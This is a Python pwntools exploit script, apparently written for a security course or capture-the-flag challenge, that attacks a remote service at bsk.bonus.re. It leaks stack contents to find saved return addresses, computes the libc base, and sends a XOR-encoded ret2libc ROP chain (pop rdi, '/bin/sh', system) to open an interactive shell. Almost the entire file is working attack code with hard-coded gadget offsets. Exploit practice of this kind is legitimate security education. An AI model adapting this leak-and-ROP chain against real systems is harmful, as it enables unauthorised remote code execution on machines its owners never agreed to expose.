#!/usr/bin/env python3
from pwn import *

# exe = ELF("./hard")
# exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")


context.binary = exe
index_number = b"456366"


def conn():
    # r = process([exe.path, index_number])

    r = remote("bsk.bonus.re", 13337)

#    context.terminal = ["tmux", "splitw", "-v"]
#    gdb.attach(r,'''
#            set follow-fork-mode child
#            record
#            continue
#            ''')

    return r


scode = b'456366'
difficulty = b'1'

datalen = 1

data = b'\x41' * 1


# debug easy, i f to get saved rip value then subtract $rax from it.
offsetlen = 72
# i f in main, subtract saved rip in decrypt from saved in main to figure it out
offset2len = 32
retaddrlen = 8  # should I even explain this

retaddr = b"\x00" * retaddrlen

offset = offsetlen * b"\x00"

keylen = 4*retaddrlen + offsetlen

scoutkey_len = 120  # large enough to hit both saved values
scoutkey = b'\x00' * scoutkey_len

# Offsets
# np. "gdb ./libc.so.6" i polecenie "p/x &system"
SYSTEM_OFF = 0x55230
# strings -tx ./libc.so.6 | grep '/bin/sh'
BIN_SH_OFF = 0x1c041b
# ROPgadget --binary ./libc.so.6 | grep 'pop rdi'
POP_RDI_OFF = 0x0000000000028715  # pop rdi ; ret


f = open('input.txt', 'wb')
f.write(str(datalen).encode() + b'\n' + data + b'\n' +
        str(scoutkey_len).encode() + b'\n' + scoutkey + b'\n')


def main():
    r = conn()
    # good luck!

    # send stud code and difficulty
    r.sendline(scode)
    r.sendline(difficulty)

    # send data consisting of 1 char
    r.sendline(str(datalen).encode())

    r.sendline(data)

    # send first key to figure out stack info
    r.sendline(str(scoutkey_len).encode())
    r.sendline(scoutkey)

    r.recvuntil(b"Here's your decrypted data:\n")
    stack = r.recvn(scoutkey_len)
    # ret value and a few values after it
    ret_to_main = u64(stack[offsetlen:offsetlen+8])
    ret_to_main2 = u64(stack[offsetlen+8:offsetlen+16])
    ret_to_main3 = u64(stack[offsetlen+16:offsetlen+24])
    ret_to_main4 = u64(stack[offsetlen+24:offsetlen+32])

    ret_from_main = u64(stack[offsetlen+offset2len:offsetlen+offset2len+8])

#    open up gdb with exec of hard_patched
#    0x7ffff7e36630 - putchar
#
#
#    0x7ffff7dd90d0 -- saved rip on main
#    0x85630 -- offset of putchar in libc
#
#
#    hence offset from base address of libc is
#    0x7ffff7dd90d0  - 0x7ffff7e36630  + 0x85630 = 0x280d0

    lib = ret_from_main - 0x280d0

    print("ret to main: ", hex(ret_to_main))
    print("ret to main2: ", hex(ret_to_main2))
    print("ret to main3: ", hex(ret_to_main3))
    print("ret from main: ", hex(ret_from_main))
    print("libc base: ", hex(lib))

    print("stack: ", bytes(stack[72:]))

    r.sendline(str(datalen).encode())
    r.sendline(data)
    r.sendline(str(keylen).encode())
    key = offset
    key += p64((lib + POP_RDI_OFF + 1) ^ ret_to_main)
    key += p64((lib + POP_RDI_OFF) ^ ret_to_main2)
    key += p64((lib + BIN_SH_OFF) ^ ret_to_main3)
    key += p64((lib + SYSTEM_OFF) ^ ret_to_main4)

    assert (keylen == len(key))
    print("key is: ", str(key)[72:])

    print("lengt of key is: ", len(key))
    r.sendline(key)
    f.write(str(datalen).encode() + b'\n' + data + b'\n' +
            str(keylen).encode() + b'\n' + key + b'\n')
    f.close()
    r.interactive()


if __name__ == "__main__":
    main()
